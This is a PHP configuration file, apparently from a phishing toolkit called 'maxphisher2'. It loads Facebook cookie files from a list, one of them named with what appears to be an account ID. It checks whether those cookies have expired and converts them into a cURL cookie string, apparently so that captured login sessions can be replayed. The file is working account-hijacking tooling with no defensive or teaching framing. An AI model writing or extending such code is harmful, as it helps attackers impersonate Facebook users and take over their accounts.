<?php
// cookie_config.php - Cookie file selection and loading utility

error_reporting(0);
ini_set('log_errors', 1);
ini_set('error_log', 'php_errors.log');

$cookies_dir = '/home/haymayndz/maxphisher2-clean/cookies/';

// Cookie file priority (ordered by preference)
$cookie_files = [
    'facebook_cookies_laspinas.json',
    'facebook_cookies_new.json',
    'facebook_cookies_61555910038213.json',
    'facebook_cookies.json'
];

/**
 * Load cookies from JSON file
 * @param string $cookie_file Path to cookie JSON file
 * @return array|false Array of cookies or false on failure
 */
function load_cookies_from_json($cookie_file) {
    if (!file_exists($cookie_file)) {
        return false;
    }
    
    $content = file_get_contents($cookie_file);
    if (empty($content)) {
        return false;
    }
    
    $cookies = json_decode($content, true);
    if (!is_array($cookies)) {
        return false;
    }
    
    return $cookies;
}

/**
 * Convert cookie array to cURL cookie string
 * @param array $cookies Array of cookie objects
 * @return string Cookie string for cURL
 */
function cookies_to_curl_string($cookies) {
    if (!is_array($cookies)) {
        return '';
    }
    
    $cookie_string = '';
    foreach ($cookies as $cookie) {
        if (isset($cookie['name']) && isset($cookie['value'])) {
            if (!empty($cookie_string)) {
                $cookie_string .= '; ';
            }
            $cookie_string .= $cookie['name'] . '=' . $cookie['value'];
        }
    }
    
    return $cookie_string;
}

/**
 * Get valid cookies (try each file in priority order)
 * @return array|false Array with 'cookies' and 'cookie_string' or false
 */
function get_valid_cookies() {
    global $cookies_dir, $cookie_files;
    
    foreach ($cookie_files as $cookie_file) {
        $full_path = $cookies_dir . $cookie_file;
        $cookies = load_cookies_from_json($full_path);
        
        if ($cookies !== false && !empty($cookies)) {
            // Check if cookies are still valid (not expired)
            $has_valid_cookie = false;
            foreach ($cookies as $cookie) {
                if (isset($cookie['expires'])) {
                    $expires = $cookie['expires'];
                    // Handle both timestamp formats
                    if ($expires > 0 && $expires > time()) {
                        $has_valid_cookie = true;
                        break;
                    } elseif ($expires == -1) {
                        // Session cookie (never expires)
                        $has_valid_cookie = true;
                        break;
                    }
                } else {
                    // No expiry means session cookie
                    $has_valid_cookie = true;
                    break;
                }
            }
            
            if ($has_valid_cookie) {
                $cookie_string = cookies_to_curl_string($cookies);
                return [
                    'cookies' => $cookies,
                    'cookie_string' => $cookie_string,
                    'source_file' => $cookie_file
                ];
            }
        }
    }
    
    return false;
}

